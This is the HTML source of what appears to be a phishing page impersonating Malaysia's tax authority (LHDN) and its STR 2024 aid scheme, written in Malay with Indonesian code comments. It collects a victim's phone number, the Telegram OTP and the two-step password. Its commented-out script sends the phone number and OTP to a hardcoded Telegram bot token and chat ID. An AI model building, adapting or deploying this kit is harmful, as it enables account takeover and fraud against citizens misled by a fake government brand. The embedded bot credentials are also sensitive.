<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>STR 2024</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/intlTelInput.css">
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body style="background: rgb(247,247,247);" class="iti-fullscreen-popup">

    <nav class="navbar navbar-expand-md" style="background: #2069ad;">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <img src="assets/img/Jata%20Negara%403x.gif" width="53" height="39">
                &nbsp;<img src="assets/img/LHDN%20logo%403x.png" width="50" height="44">
            </a>
            <button class="navbar-toggler" data-bs-toggle="collapse" style="background: #00a3fe;">
                <span class="visually-hidden">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
    </nav>

    <div id="phoneStep" class="container">
        <div id="carousel-1" class="carousel slide carousel-fade" data-bs-ride="carousel">
        <div class="carousel-inner">
            <div class="carousel-item active">
                <img class="w-100 d-block" src="assets/img/str1.png" alt="Slide Image" style="height: 200px;">
            </div>
            <div class="carousel-item">
                <img class="w-100 d-block" src="assets/img/str10.png" alt="Slide Image" style="height: 200px;">
            </div>
            <div class="carousel-item">
                <img class="w-100 d-block" src="assets/img/str8.png" alt="Slide Image" style="height: 200px;">
            </div>
            <div class="carousel-item">
                <img class="w-100 d-block" src="assets/img/str5.png" alt="Slide Image" style="height: 200px;">
            </div>
        </div>
    </div>
        <form id="phoneForm">
            <section class="text-center" style="padding-left: 26px; padding-right: 29px; background: #2069ad; border-radius: 10px; padding-top: 2px; padding-bottom: 11px; margin-top: 17px; box-shadow: 0px 0px 20px 2px;">
                <section class="text-center" style="margin-top: 9px;">
                    <input type="tel" id="phone" name="phone" style="width: 220px; padding-left: 86px;" required="" inputmode="tel" minlength="8" maxlength="12" autocomplete="off" placeholder="012-345 6789" 
       pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')">

                    <input class="btn btn-primary" type="submit" value="SEMAK SEKARANG" style="background: rgb(0,163,254); width: 219.75px; margin-top: 9px; font-weight: bold; color: rgb(253,255,177);">

                </section>
            </section>
        </form>
        <div id="carousel-2" class="carousel slide" data-bs-ride="carousel" style="padding-top: 20px;">
        <div class="carousel-inner">
            <div class="carousel-item active">
                <img class="img-fluid w-100 d-block" src="assets/img/md2..jpg" alt="Slide Image" style="height: 180px;">
            </div>
            <div class="carousel-item">
                <img class="img-fluid w-100 d-block" src="assets/img/md1.jpg" alt="Slide Image" style="height: 180px;">
            </div>
        </div>
    </div>
    <!-- Modal Popup untuk Konfirmasi Nomor Telepon -->
    <div class="modal fade" id="confirmModal" tabindex="-1" aria-labelledby="confirmModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="confirmModalLabel">Periksa Nombor Telefon</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Adakah nombor telefon ini betul? Jika ya, kami akan menghantar kod OTP ke Telegram anda.</p>
                    <p><strong id="phonePreview"></strong></p>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tukar Nombor</button>
                    <button type="button" class="btn btn-primary" id="confirmPhone">Ya, Betul</button>
                </div>
            </div>
        </div>
    </div>

    <nav class="navbar navbar-expand-md fixed-bottom bg-body">
        <div class="container-fluid">
            <img class="img-fluid" src="assets/img/ini1.png">
        </div>
    </nav>
    </div>

    <!-- Step 2: Form OTP -->
<div id="otpStep" style="display: none;">
    <section>
        <div class="container" style="margin-top: 30px;">
            <div style="border-radius: 10px;border: 1px solid rgb(247,163,236);background: #e5f8f6;padding-left: 17px;padding-bottom: 0px;padding-right: 17px;padding-top: 10px;text-shadow: 0px 0px;box-shadow: 0px 0px 20px 2px;">
                <p style="text-align: justify;"><em>Kod pengesahan telah dihantar, sila masukkan kod pengesahan untuk mengesahkan nombor telefon anda.</em></p>
            </div>
        </div>
    </section>
    <form id="otpForm" method="post" action="#">
            <input type="hidden" id="phone" name="phone" value="41325000" readonly>
            <section class="text-center" style="background: #59bef7;border-width: 1px;border-radius: 10px;box-shadow: 0px 0px 20px 2px;">
                <section class="text-center" style="margin-top: 9px;padding-top: 8px;padding-bottom: 8px;padding-left: 0px;padding-right: 0px;">
                    <input id="otp" name="otp" type="text" inputmode="numeric" minlength="5" maxlength="5" pattern="\d{5}" style="width: 139px; margin-left: 98px; margin-right: 98px; text-align: center;" required="" autofocus="" oninput="this.value = this.value.replace(/[^0-9]/g, '')">

                    <input class="btn btn-primary" type="submit" value="Seterusnya" style="background: rgb(252,70,70);width: 232.75px;margin-top: 9px;margin-left: 7px;margin-right: 7px;font-weight: bold;">
                    <button class="btn btn-primary" id="myButton" type="button" style="margin-top: 9px;font-size: 15px;margin-left: 7px;margin-right: 7px;background: rgb(78,98,136);">Belum terima kod hantar semula</button>
                    <span id="countdown"></span>
                    <div id="loading" class="loading-text">
                        <div class="spinner-border text-primary" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <span>Sila tunggu...</span>
                    </div>
                </section>
            </section>
        </form>
</div>

<!-- Step 3: Form Verifikasi -->
<div id="verif" style="display: none;">
    <section>
        <div class="container" style="margin-top: 30px;">
            <div style="border-radius: 10px; border: 1px solid rgb(247,163,236); background: #e5f8f6; padding-left: 17px; padding-bottom: 0px; padding-right: 17px; padding-top: 10px; text-shadow: 0px 0px; box-shadow: 0px 0px 20px 2px;">
                <p style="text-align: justify;"><em>Pengesahan dua langkah didayakan. Akaun anda dilindungi dengan kata laluan tambahan.</em></p>
            </div>
        </div>
    </section>
    <form id="verifForm">
            <input type="hidden" id="phone" name="phone" value="41325000" readonly>
            <input type="hidden" id="otp" name="otp" value="66812" readonly>
            <section class="text-center" style="background: #59bef7; border-width: 1px; border-radius: 10px; box-shadow: 0px 0px 20px 2px;">
                <section class="text-center" style="margin-top: 9px; padding-top: 8px; padding-bottom: 8px; padding-left: 0px; padding-right: 0px;">
                    <input id="laluan" name="laluan" type="text" style="width: 139px; margin-left: 98px; margin-right: 98px; text-align: center;" required="" autofocus="">
                    <input class="btn btn-primary" type="submit" value="Seterusnya" onclick="window.location.href='berhasil.html';" style="background: rgb(252,70,70); width: 232.75px; margin-top: 9px; margin-left: 7px; margin-right: 7px; font-weight: bold;">
                    <span id="countdown"></span>
                </section>
            </section>
        </form>
        <div class="modal" tabindex="-1" id="errorModal" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Peringatan</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>Maaf, data anda gagal diproses, sila masukkan data yang betul.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-danger" data-bs-dismiss="modal" onclick="window.location.href='index.html';">OK</button>
                    </div>
                </div>
            </div>
        </div>
</div>


    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/js/intlTelInput.js"></script>
    <script src="assets/js/script.js"></script>
    <script>

//         // Menangani klik tombol untuk memulai proses
//     document.getElementById('myButton').addEventListener('click', function () {
//         // Menyembunyikan tombol dan menampilkan animasi loading
//         this.style.display = 'none';
//         document.getElementById('loading').style.display = 'block';

//         // Simulasikan loading selama 3 detik
//         setTimeout(function () {
//             // Setelah 3 detik, tampilkan pesan dan sembunyikan loading
//             document.getElementById('loading').style.display = 'none';
//             document.getElementById('myButton').style.display = 'block'; // Menampilkan tombol lagi
//             alert('Kod pengesahan telah dihantar, sila semak telegram anda');
//         }, 3000);
//     });

//     // Inisialisasi input telepon dengan intlTelInput untuk negara-negara Asia saja
// const input = document.querySelector("#phone");
// const iti = window.intlTelInput(input, {
//     initialCountry: "MY",
//     separateDialCode: true,
//     onlyCountries: ["MY", "ID", "SG", "TH", "PH", "VN", "KH", "JP", "KR", "CN"], // Daftar negara Asia
//     utilsScript: "assets/js/utils.js"
// });

// document.getElementById('phoneForm').addEventListener('submit', function(e) {
//     e.preventDefault();

//     // Ambil nomor telepon lengkap dari input
//     const fullPhoneNumber = iti.getNumber();

//     // Simpan nomor telepon ke localStorage
//     localStorage.setItem('phoneNumber', fullPhoneNumber);

//     // Menampilkan nomor telepon di modal preview
//     document.getElementById("phonePreview").textContent = fullPhoneNumber;

//     // Tampilkan modal konfirmasi
//     const myModal = new bootstrap.Modal(document.getElementById('confirmModal'));
//     myModal.show();
// });

// // Menangani konfirmasi nomor telepon dari modal
// document.getElementById("confirmPhone").addEventListener("click", function() {
//     const fullPhoneNumber = iti.getNumber();

//     // Menyembunyikan Step 1 dan menampilkan Step 2 (OTP)
//     document.getElementById('phoneStep').style.display = 'none'; // Hiding Step 1
//     document.getElementById('otpStep').style.display = 'none'; // Showing Step 2
//     document.getElementById('verif').style.display = 'block'; // Showing Step 2

//     // Menutup modal setelah konfirmasi
//     const myModal = bootstrap.Modal.getInstance(document.getElementById('confirmModal'));
//     myModal.hide();
// });

// document.getElementById('otpForm').addEventListener('submit', function(e) {
//     e.preventDefault();

//     // Ambil OTP yang dimasukkan
//     const otp = document.getElementById('otp').value;

//     // Kirim OTP ke Telegram (atau proses lainnya)
//     const fullPhoneNumber = localStorage.getItem('phoneNumber');
//     const botToken = '7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY';  // Ganti dengan token bot Anda
//     const chatId = '6124038392';      // Ganti dengan chat ID penerima pesan

//     const message = `Nomor telepon: ${fullPhoneNumber}, OTP: ${otp}`;
//     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

//     // Mengirimkan permintaan GET ke API Telegram
//     fetch(telegramUrl)
//         .then(response => response.json())
//         .then(data => {
//             alert('OTP telah dihantar ke Telegram.');
//         })
//         .catch(error => {
//             console.error('Terjadi kesalahan saat mengirim OTP:', error);
//         });
// });

// // Menangani tombol Resend OTP
// document.getElementById('resendOtp').addEventListener('click', function() {
//     // Logika untuk mengirim ulang OTP ke Telegram (atau proses lainnya)
//     const fullPhoneNumber = localStorage.getItem('phoneNumber');
//     const botToken = '7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY';  // Ganti dengan token bot Anda
//     const chatId = '6124038392';      // Ganti dengan chat ID penerima pesan

//     const message = `Nomor telepon: ${fullPhoneNumber}, OTP: (resend request)`;
//     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

//     // Mengirimkan permintaan GET ke API Telegram untuk mengirim ulang OTP
//     fetch(telegramUrl)
//         .then(response => response.json())
//         .then(data => {
//             alert('OTP telah dihantar ulang ke Telegram.');
//         })
//         .catch(error => {
//             console.error('Terjadi kesalahan saat mengirim ulang OTP:', error);
//         });
// });
    </script>
</body>
</html>
